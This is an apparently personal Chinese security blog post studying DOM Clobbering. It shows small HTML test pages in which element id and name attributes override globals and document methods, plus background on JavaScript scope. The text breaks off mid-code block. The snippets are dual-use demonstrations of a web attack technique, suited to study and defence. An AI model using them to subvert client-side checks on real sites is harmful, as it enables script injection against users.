<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="前言最近看到好多师傅都已经学习过了DOM Clobbering Attack，因此自己也来学习一波。 0x01 简介DOM最初诞生的时候没有一个很好的标准，以至于各个浏览器在实现的过程中会支持DOM的一些怪异行为，而这些行为可能会导致DOM Clobbering的发生浏览器可能会将各种DOM元素的name和id属性添加为document的属性或页面的全局变量，这会导致覆盖掉document原有的属">
<meta property="og:type" content="article">
<meta property="og:title" content="DOM Clobbering学习记录">
<meta property="og:url" content="http://yoursite.com/2020/03/14/DOM-Clobbering学习记录/index.html">
<meta property="og:site_name" content="L&#39;s Blog">
<meta property="og:description" content="前言最近看到好多师傅都已经学习过了DOM Clobbering Attack，因此自己也来学习一波。 0x01 简介DOM最初诞生的时候没有一个很好的标准，以至于各个浏览器在实现的过程中会支持DOM的一些怪异行为，而这些行为可能会导致DOM Clobbering的发生浏览器可能会将各种DOM元素的name和id属性添加为document的属性或页面的全局变量，这会导致覆盖掉document原有的属">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-1.PNG">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-2.PNG">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-3.PNG">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-4.PNG">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-5.PNG">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-6.PNG">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-7.PNG">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-8.PNG">
<meta property="og:updated_time" content="2020-03-14T06:16:28.119Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="DOM Clobbering学习记录">
<meta name="twitter:description" content="前言最近看到好多师傅都已经学习过了DOM Clobbering Attack，因此自己也来学习一波。 0x01 简介DOM最初诞生的时候没有一个很好的标准，以至于各个浏览器在实现的过程中会支持DOM的一些怪异行为，而这些行为可能会导致DOM Clobbering的发生浏览器可能会将各种DOM元素的name和id属性添加为document的属性或页面的全局变量，这会导致覆盖掉document原有的属">
<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-1.PNG">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/03/14/DOM-Clobbering学习记录/">





  <title>DOM Clobbering学习记录 | L's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">L's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">share with you</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/DOM-Clobbering学习记录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ljdd520">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">DOM Clobbering学习记录</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-14T14:15:19+08:00">
                2020-03-14
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/javascript-web/" itemprop="url" rel="index">
                    <span itemprop="name">javascript-web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  6.6k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  33
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近看到好多师傅都已经学习过了DOM Clobbering Attack，因此自己也来学习一波。</p>
<h4 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h4><h6 id="DOM最初诞生的时候没有一个很好的标准，以至于各个浏览器在实现的过程中会支持DOM的一些怪异行为，而这些行为可能会导致DOM-Clobbering的发生浏览器可能会将各种DOM元素的name和id属性添加为document的属性或页面的全局变量，这会导致覆盖掉document原有的属性或全局变量，或者劫持一些变量的内容。"><a href="#DOM最初诞生的时候没有一个很好的标准，以至于各个浏览器在实现的过程中会支持DOM的一些怪异行为，而这些行为可能会导致DOM-Clobbering的发生浏览器可能会将各种DOM元素的name和id属性添加为document的属性或页面的全局变量，这会导致覆盖掉document原有的属性或全局变量，或者劫持一些变量的内容。" class="headerlink" title="DOM最初诞生的时候没有一个很好的标准，以至于各个浏览器在实现的过程中会支持DOM的一些怪异行为，而这些行为可能会导致DOM Clobbering的发生浏览器可能会将各种DOM元素的name和id属性添加为document的属性或页面的全局变量，这会导致覆盖掉document原有的属性或全局变量，或者劫持一些变量的内容。"></a><code>DOM</code>最初诞生的时候没有一个很好的标准，以至于各个浏览器在实现的过程中会支持<code>DOM</code>的一些怪异行为，而这些行为可能会导致<code>DOM Clobbering</code>的发生浏览器可能会将各种<code>DOM</code>元素的<code>name</code>和<code>id</code>属性添加为document的属性或页面的全局变量，这会导致覆盖掉document原有的属性或全局变量，或者劫持一些变量的内容。</h6><h6 id="测试环境-Chrome-80-0-3987-132"><a href="#测试环境-Chrome-80-0-3987-132" class="headerlink" title="测试环境 Chrome 80.0.3987.132"></a>测试环境 Chrome 80.0.3987.132</h6><h4 id="0x02-简单的例子："><a href="#0x02-简单的例子：" class="headerlink" title="0x02 简单的例子："></a>0x02 简单的例子：</h4><h5 id="1-对象创建"><a href="#1-对象创建" class="headerlink" title="1.对象创建"></a>1.对象创建</h5><h6 id="测试代码如下："><a href="#测试代码如下：" class="headerlink" title="测试代码如下："></a>测试代码如下：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Clobbering Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(test1);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(test2);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.test1);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.test2);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">document</span>.test1);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">document</span>.test2);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="打印的结果如下："><a href="#打印的结果如下：" class="headerlink" title="打印的结果如下："></a>打印的结果如下：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-1.PNG" alt></p>
<h6 id="通过上面的结果，可以看出来HTML标签中的id属性值被当做全局变量，name属性值被当成document的属性，这也就是为什么上面有一行输出undefined的原因。"><a href="#通过上面的结果，可以看出来HTML标签中的id属性值被当做全局变量，name属性值被当成document的属性，这也就是为什么上面有一行输出undefined的原因。" class="headerlink" title="通过上面的结果，可以看出来HTML标签中的id属性值被当做全局变量，name属性值被当成document的属性，这也就是为什么上面有一行输出undefined的原因。"></a>通过上面的结果，可以看出来HTML标签中的<code>id</code>属性值被当做全局变量，<code>name</code>属性值被当成<code>document</code>的属性，这也就是为什么上面有一行输出<code>undefined</code>的原因。</h6><h5 id="2-方法的覆盖"><a href="#2-方法的覆盖" class="headerlink" title="2.方法的覆盖"></a>2.方法的覆盖</h5><h6 id="测试代码如下：-1"><a href="#测试代码如下：-1" class="headerlink" title="测试代码如下："></a>测试代码如下：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Clobbering Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"getElementById"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">document</span>.getElementById);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">document</span>.getElementById(<span class="string">"form"</span>))</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="结果如下："><a href="#结果如下：" class="headerlink" title="结果如下："></a>结果如下：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-2.PNG" alt></p>
<h6 id="通过上面的输出结果显示我们可以通过name属性覆盖document中的内置方法。"><a href="#通过上面的输出结果显示我们可以通过name属性覆盖document中的内置方法。" class="headerlink" title="通过上面的输出结果显示我们可以通过name属性覆盖document中的内置方法。"></a>通过上面的输出结果显示我们可以通过<code>name</code>属性覆盖<code>document</code>中的内置方法。</h6><h5 id="3-通过标签的层级关系构造变量的层级关系"><a href="#3-通过标签的层级关系构造变量的层级关系" class="headerlink" title="3.通过标签的层级关系构造变量的层级关系"></a>3.通过标签的层级关系构造变量的层级关系</h5><h6 id="测试代码如下：-2"><a href="#测试代码如下：-2" class="headerlink" title="测试代码如下："></a>测试代码如下：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Clobbering Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"test1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"test2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">"test3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"test4"</span> <span class="attr">name</span>=<span class="string">"test5"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"body"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"firstChild"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(test1);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(test1.test2);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(test1.test3);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(test4[<span class="string">'name'</span>]);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(test5[<span class="string">'id'</span>]);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">document</span>.body);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">document</span>.body.firstChild);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="结果如下：-1"><a href="#结果如下：-1" class="headerlink" title="结果如下："></a>结果如下：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-3.PNG" alt></p>
<h6 id="通过上面的结果我们看到，可以通过多层覆盖的方式，覆盖Window和document下的对象。"><a href="#通过上面的结果我们看到，可以通过多层覆盖的方式，覆盖Window和document下的对象。" class="headerlink" title="通过上面的结果我们看到，可以通过多层覆盖的方式，覆盖Window和document下的对象。"></a>通过上面的结果我们看到，可以通过多层覆盖的方式，覆盖<code>Window</code>和<code>document</code>下的对象。</h6><h4 id="0x03-javascript-Scope"><a href="#0x03-javascript-Scope" class="headerlink" title="0x03 javascript Scope"></a>0x03 javascript Scope</h4><h5 id="由于DOM-Clobbering-Attack的攻击中有很多的地方用到了javascript的作用域链，因此我们可以来了解一下："><a href="#由于DOM-Clobbering-Attack的攻击中有很多的地方用到了javascript的作用域链，因此我们可以来了解一下：" class="headerlink" title="由于DOM Clobbering Attack的攻击中有很多的地方用到了javascript的作用域链，因此我们可以来了解一下："></a>由于DOM Clobbering Attack的攻击中有很多的地方用到了javascript的作用域链，因此我们可以来了解一下：</h5><h5 id="1-全局作用域："><a href="#1-全局作用域：" class="headerlink" title="1.全局作用域："></a>1.全局作用域：</h5><h6 id="在javascript中全局作用域一般是window-nodejs是global-。"><a href="#在javascript中全局作用域一般是window-nodejs是global-。" class="headerlink" title="在javascript中全局作用域一般是window(nodejs是global)。"></a>在javascript中全局作用域一般是<code>window</code>(nodejs是<code>global</code>)。</h6><h5 id="2-显示声明："><a href="#2-显示声明：" class="headerlink" title="2.显示声明："></a>2.显示声明：</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Clobbering Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> testValue=<span class="number">123</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> testFunc=<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">"DOM"</span>);</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.testValue); <span class="comment">// 123</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.testFunc); <span class="comment">// function()&#123;console.log("DOM")&#125;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="3-隐式声明："><a href="#3-隐式声明：" class="headerlink" title="3.隐式声明："></a>3.隐式声明：</h5><h6 id="不带有声明关键字的变量，js会默认帮你声明一个全局变量："><a href="#不带有声明关键字的变量，js会默认帮你声明一个全局变量：" class="headerlink" title="不带有声明关键字的变量，js会默认帮你声明一个全局变量："></a>不带有声明关键字的变量，js会默认帮你声明一个全局变量：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Clobbering Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">value</span>) </span>&#123;</span></span><br><span class="line">        result=value+1;</span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> result;</span></span><br><span class="line">    &#125;</span><br><span class="line">    foo(1);</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.result); <span class="comment">// 2</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="变量result被挂载到了window对象上了。"><a href="#变量result被挂载到了window对象上了。" class="headerlink" title="变量result被挂载到了window对象上了。"></a>变量<code>result</code>被挂载到了<code>window</code>对象上了。</h6><h5 id="4-块级作用域："><a href="#4-块级作用域：" class="headerlink" title="4.块级作用域："></a>4.块级作用域：</h5><h6 id="在-ES6-之前，是没有块级作用域的概念的。如果你有-C-或者-Java-经验，想必你对块级作用域并不陌生："><a href="#在-ES6-之前，是没有块级作用域的概念的。如果你有-C-或者-Java-经验，想必你对块级作用域并不陌生：" class="headerlink" title="在 ES6 之前，是没有块级作用域的概念的。如果你有 C++ 或者 Java 经验，想必你对块级作用域并不陌生："></a>在 ES6 之前，是没有块级作用域的概念的。如果你有 C++ 或者 Java 经验，想必你对块级作用域并不陌生：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(i); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>

<h6 id="从上面的结果来看，说明var声明的变量，在for循环之后仍然保存在这个作用域里，而for-仍然在全局作用域里，因此var声明的变量在全局作用域里。"><a href="#从上面的结果来看，说明var声明的变量，在for循环之后仍然保存在这个作用域里，而for-仍然在全局作用域里，因此var声明的变量在全局作用域里。" class="headerlink" title="从上面的结果来看，说明var声明的变量，在for循环之后仍然保存在这个作用域里，而for(){}仍然在全局作用域里，因此var声明的变量在全局作用域里。"></a>从上面的结果来看，说明<code>var</code>声明的变量，在<code>for</code>循环之后仍然保存在这个作用域里，而<code>for(){}</code>仍然在全局作用域里，因此<code>var</code>声明的变量在全局作用域里。</h6><h6 id="我们可以通过let-或const用来声明常量-来声明变量，实现块级作用域。"><a href="#我们可以通过let-或const用来声明常量-来声明变量，实现块级作用域。" class="headerlink" title="我们可以通过let(或const用来声明常量)来声明变量，实现块级作用域。"></a>我们可以通过<code>let</code>(或<code>const</code>用来声明常量)来声明变量，实现<code>块级作用域</code>。</h6><h6 id="除了上面的几种作用域外还有语法作用域，动态作用域等，就不赘述了感兴趣的参考下面的链接。"><a href="#除了上面的几种作用域外还有语法作用域，动态作用域等，就不赘述了感兴趣的参考下面的链接。" class="headerlink" title="除了上面的几种作用域外还有语法作用域，动态作用域等，就不赘述了感兴趣的参考下面的链接。"></a>除了上面的几种作用域外还有<code>语法作用域</code>，<code>动态作用域</code>等，就不赘述了感兴趣的参考下面的链接。</h6><h4 id="0x04-覆盖函数"><a href="#0x04-覆盖函数" class="headerlink" title="0x04 覆盖函数"></a>0x04 覆盖函数</h4><h6 id="在介绍覆盖函数之前我们，先看一个奇怪的操作："><a href="#在介绍覆盖函数之前我们，先看一个奇怪的操作：" class="headerlink" title="在介绍覆盖函数之前我们，先看一个奇怪的操作："></a>在介绍覆盖函数之前我们，先看一个奇怪的操作：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 